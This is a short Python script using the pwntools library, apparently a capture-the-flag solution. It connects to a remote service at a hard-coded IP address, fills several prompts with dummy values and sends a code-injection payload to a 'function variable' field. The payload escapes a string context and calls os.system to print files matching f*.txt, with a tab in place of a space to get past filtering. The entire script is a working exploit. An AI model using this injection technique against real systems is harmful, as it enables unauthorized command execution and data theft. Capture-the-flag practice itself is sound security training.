from pwn import *
p = remote("104.154.189.186", 7103)

payload = "x']*os.system('cat\tf*.txt')#'"
p.sendlineafter(b"n: ", b"2")
p.sendlineafter(b"e: ", b"2")
p.sendlineafter(b"c1: ", b"2")
p.sendlineafter(b"c2: ", b"2")
p.sendlineafter(b"function variable: ", payload.encode())
p.sendlineafter(b"f: ", b"1")
p.sendlineafter(b"g: ", b"1")
p.interactive()
